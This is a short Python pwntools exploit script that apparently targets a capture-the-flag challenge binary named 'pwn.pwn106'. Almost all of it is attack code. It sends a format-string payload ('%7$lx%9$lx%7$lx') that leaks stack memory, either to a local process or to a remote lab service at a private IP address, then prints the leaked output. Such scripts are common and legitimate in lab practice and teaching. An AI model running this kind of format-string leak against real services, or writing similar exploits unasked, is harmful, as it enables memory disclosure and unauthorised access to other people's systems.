from pwn import *


payload = b"%7$lx" + b"%9$lx"  + b"%7$lx"

def local_pwn():
    p = process("./pwn.pwn106")
    print(p.recvuntil("giveaway: ").decode())
    # sleep(2)
    p.send(payload)
    # data = 
    print(p.recvall())
    # data = str(data).strip("bThanks '")
    # print(bytes.fromhex(data))
def remote_pwn():
    p = remote("10.10.47.155", 9006)
    print(p.recvuntil("giveaway: ").decode())
    # sleep(2)
    p.send(payload)
    data = p.recvline_contains("Thanks")
    print(data)
    data = str(data).strip("bThanks '")
    # print(bytes.fromhex(data))

local_pwn()